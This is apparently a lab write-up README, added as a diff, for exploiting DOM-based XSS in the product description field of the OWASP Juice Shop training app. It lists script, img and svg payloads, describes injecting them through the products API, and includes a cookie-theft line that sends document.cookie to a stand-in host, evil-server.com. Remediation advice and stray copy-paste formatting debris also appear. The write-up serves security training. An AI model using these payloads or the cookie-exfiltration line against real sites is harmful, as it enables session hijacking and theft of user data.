@@ -1,0 +1,151 @@
+Method-4-Product-Description-XSS/README.md
+markdown
+Copy code
+# 🧠 Method 4 – Product Description Injection (DOM-Based Cross-Site Scripting)
+
+---
+
+## 🔍 Overview
+
+This attack method exploits a **DOM-based XSS vulnerability** arising from unsanitized input in the product `description` field. If the web application reflects raw user input directly into the DOM using insecure methods like `innerHTML`, it becomes susceptible to **arbitrary JavaScript execution**. This vulnerability may arise either due to direct access to an admin interface or insecure backend APIs allowing product metadata manipulation.
+
+The OWASP Juice Shop frontend uses Angular, but DOM XSS may still occur if inner content bindings do not escape malicious characters. In this method, an attacker modifies a product description field to contain executable payloads. When any user visits the product detail page, the payload executes within the browser context — triggering the **Bonus Payload Challenge**.
+
+---
+
+## 🧬 Vulnerability Class
+
+- **Type:** DOM-Based Cross-Site Scripting (XSS)
+- **Context:** Rendered HTML from untrusted data source
+- **Sink:** `innerHTML`, Angular unescaped bindings
+- **Attack Surface:** Product metadata injection (e.g., product description)
+- **CVE Analogous:** CVE-2020-11022 (jQuery XSS Sink), CVE-2019-5418 (HTML rendering bypass)
+
+---
+
+## 🎯 Objective
+
+Demonstrate successful exploitation of a product metadata field resulting in client-side execution of injected JavaScript. The goal is to trigger the OWASP Juice Shop’s internal XSS validator and mark the Bonus Payload challenge as solved.
+
+---
+
+## 🔎 Attack Surface
+
+### Target Field:
+- `description` field in a product object
+
+### Where to Inject:
+- Admin panel (if available)
+- Direct PUT/POST to `/api/Products/:id` using tools like:
+  - Burp Suite
+  - Postman
+  - Curl
+
+---
+
+## 💣 Payload Arsenal
+
+### Raw Payloads:
+```html
+<script>alert('XSS via description')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('Product XSS')>
+Encoded Payloads:
+bash
+Copy code
+%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E
+⚙️ Step-by-Step Execution Flow
+Discover or access the attack vector:
+
+Locate the product editor interface or make a direct API call to modify the description.
+
+Inject the payload:
+
+Use a malicious payload such as:
+
+html
+Copy code
+<script>alert('XSS via description')</script>
+Render vulnerable view:
+
+Navigate to the product details page from the UI.
+
+Observe how the browser executes the payload as part of the HTML.
+
+Scoreboard Validation:
+
+Confirm the execution triggers Juice Shop’s XSS detection mechanism.
+
+The Bonus Payload Challenge should be marked as completed.
+
+✅ Indicators of Successful Exploitation
+Indicator	Description
+🔔 Alert Popup	Alert message with script output executes in browser.
+✅ Scoreboard Tick	Bonus Payload challenge marked as “solved.”
+🔍 DOM Reflection	Payload is visibly inserted via DevTools > Elements tab.
+📦 Source Location	The malicious string exists in products API response.
+
+🧪 Optional Post-Exploitation Checks
+Cookie Theft Simulation:
+
+html
+Copy code
+<script>fetch('http://evil-server.com/log?c=' + document.cookie)</script>
+CSP Bypass Attempts (Advanced):
+
+Inject inline JavaScript or external references if CSP allows.
+
+🔐 Remediation Strategies (Dev Perspective)
+Problem	Solution
+Direct use of innerHTML	Use textContent or binding sanitation methods
+No input validation	Apply input sanitization libraries (e.g., DOMPurify)
+Poor output encoding	Encode user inputs before inserting into the DOM
+Weak CSP policy	Enforce strict CSP headers (disallow unsafe-inline)
+
+📸 Evidence Collection
+Screenshot Filename:
+XSS-Product-Description-Payload.png
+
+Required in Screenshot:
+
+Alert box triggered
+
+Visible Scoreboard with challenge solved
+
+Highlighted payload in product description via DevTools (optional)
+
+📁 Suggested Repository Structure
+mathematica
+Copy code
+OWASP-Juice-Shop-Bonus-Payload/
+└── Method-4-Product-Description-XSS/
+    ├── README.md
+    ├── To-Do-Product-Description-XSS.md
+    ├── payload.txt
+    ├── XSS-Product-Description-Payload.png
+🧾 GitOps Workflow
+bash
+Copy code
+# Navigate into folder
+cd ~/juice-shop/OWASP-Juice-Shop-Bonus-Payload/Method-4-Product-Description-XSS
+
+# Stage changes
+git add .
+
+# Commit with meaningful message
+git commit -m "🚨 Method-4: Product Description DOM XSS – PoC & documentation added"
+
+# Push to GitHub
+git push origin main
+🔚 Summary
+Component	Status
+Vulnerability	DOM-Based XSS
+Vector	Product Description
+Sink	innerHTML
+Severity	Medium → High
+Risk	Client-side code exec
+Challenge Solved	✅ Bonus Payload
+
+🧠 "When the DOM trusts the data blindly, the browser becomes your weapon."
+
